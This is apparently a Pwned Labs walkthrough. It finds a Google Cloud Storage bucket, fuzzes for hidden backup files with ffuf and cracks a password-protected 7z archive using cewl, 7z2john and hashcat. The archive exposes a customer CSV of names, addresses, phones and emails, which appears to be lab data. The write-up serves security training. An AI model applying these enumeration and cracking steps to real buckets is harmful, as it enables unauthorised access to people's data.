---
title: Reveal Hidden Files in Google Storage 
description: Reveal Hidden Files in Google Storage 
image:
  path: gcp.png
categories:
- Pwned Labs
- GCP
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/gcp/
tags:
- pwnedlabs
- gcp
- cloud
---
# Scenario
Gigantic Retail are a Fortune 50 company and therefore have a target on their back. Conscious that threat actors will be probing their infrastructure, they have provisionally engaged your team to assess the security of their on-premise and cloud environment. Your mission is to demonstrate impact and show them the value of retaining our services in the long-term.

# Walkthrough
We are given url, which redirects to website with static content

![](reveal-hidden-files-in-google-storage-1.png)


If we view source code, we see the link to `https://storage.googleapis.com/it-storage-bucket`, which is [Google Storage Bucket](https://cloud.google.com/storage/docs/buckets)

![](reveal-hidden-files-in-google-storage-2.png)


The subdomain `storage.googleapis.com` is used by [Google Storage service](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-services/gcp-storage-enum.html#enumeration), while `it-storage-bucket` is bucket name. 

Let's use Google Cloud CLI and check the bucket (create some google account)
```
└─$ gcloud auth login  
```

We can try listing bucket contents, but we receive don't have access. 
```
└─$ gcloud storage buckets list gs://it-storage-bucket/
ERROR: (gcloud.storage.buckets.list) [<REDACTED>] does not have permission to access b instance [it-storage-bucket] (or it may not exist): <REDACTED> does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist). This command is authenticated as <REDACTED> which is the active account specified by the [core/account] property.               
```
```
└─$ gsutil ls gs://it-storage-bucket/
AccessDeniedException: 403 <REDACTED> does not have storage.objects.list access to the Google Cloud Storage bucket. Permission 'storage.objects.list' denied on resource (or it may not exist).     
```

We check metadata of the `index.html` 
```
└─$ gsutil stat gs://it-storage-bucket/index.html
gs://it-storage-bucket/index.html:
    Creation time:          Tue, 26 Dec 2023 17:16:02 GMT
    Update time:            Tue, 26 Dec 2023 20:16:06 GMT
    Storage class:          STANDARD
    Content-Length:         11407
    Content-Type:           text/html
    Hash (crc32c):          NQiHAw==
    Hash (md5):             rIHCYQzSUEHllo04PfXd0w==
    ETag:                   CMTu57HNrYMDEAI=
    Generation:             1703610962016068
    Metageneration:         2

```

We can't browse the bucket contents directly (unless some object URLs are exposed via the website), but we can fuzz the endpoint for potential files, directories etc. (since Cloud Storage relies on names to identify buckets and objects). 

We can start fuzzing with [xajkep's wordlist](https://github.com/xajkep/wordlists) to enumerate for common backup filenames.

```
└─$ ffuf -w /usr/share/xajkep-wordlists/discovery/backup_files_only.txt -u https://storage.googleapis.com/it-storage-bucket/FUZZ -mc 200 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://storage.googleapis.com/it-storage-bucket/FUZZ
 :: Wordlist         : FUZZ: /usr/share/xajkep-wordlists/discovery/backup_files_only.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

backup.7z               [Status: 200, Size: 22072, Words: 102, Lines: 101, Duration: 499ms]

```

We find `backup.7z` archive, let's download it using `gsutil`
```
└─$ gsutil cp gs://it-storage-bucket/backup.7z .
Copying gs://it-storage-bucket/backup.7z...
- [1 files][ 21.6 KiB/ 21.6 KiB]                                                
Operation completed over 1 objects/21.6 KiB.  
```

The archive is password protected
```
└─$ 7z x backup.7z 

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:65535

Scanning the drive for archives:
1 file, 22072 bytes (22 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 22072
Headers Size = 232
Method = LZMA2:16 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
```

We can generate custom wordlist using `cewl` by spidering a targets website and collecting unique words.
```
cewl https://careers.gigantic-retail.com/index.html > wordlist.txt
```

Now we need to extract the hash via `7z2john`
```
└─$ 7z2john backup.7z > backup.hash
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
    
```

Next, we use hashcat to crack the hash. Before running the hashcat, remove `<FILENAME>:` portion from the hash, since `7z2john` saves it in the following format `<FILENAME>:<HASH>`.
```
└─$ hashcat -m 11600 backup.hash wordlist.txt
hashcat (v6.2.6) starting
<SNIP>
$7z$2$19$0$$8$1090375a5c67675f0000000000000000$3425971665$<SNIP>022ff80c9590343e1a91b13db$54160$08:<REDACTED>
<SNIP>
```

Password works, now we can access archive's content
```
└─$ ls -lha         
total 140K
drwxrwxr-x 2 kali kali 4.0K Aug  8 01:08 .
drwxrwxr-x 5 kali kali 4.0K Jun 22 00:35 ..
-rw-rw-r-- 1 kali kali  22K Aug  8 00:59 backup.7z
-rw------- 1 kali kali  53K Dec 27  2023 customers-credit-review.csv
-rw-r--r-- 1 kali kali   33 Dec 27  2023 flag.txt
```
```
└─$ cat customers-credit-review.csv 
first_name,last_name,address,city,county,state,zip,phone1,phone2,email
James,Butt,6649 N Blue Gum St,New Orleans,Orleans,LA,70116,504-621-8927,504-845-1427,jbutt@gmail.com
Josephine,Darakjy,4 B Blue Ridge Blvd,Brighton,Livingston,MI,48116,810-292-9388,810-374-9840,josephine_darakjy@darakjy.org
Art,Venere,8 W Cerritos Ave #54,Bridgeport,Gloucester,NJ,8014,856-636-8749,856-264-4130,art@venere.org
Lenna,Paprocki,639 Main St,Anchorage,Anchorage,AK,99501,907-385-4412,907-921-2010,lpaprocki@hotmail.com
<SNIP>
```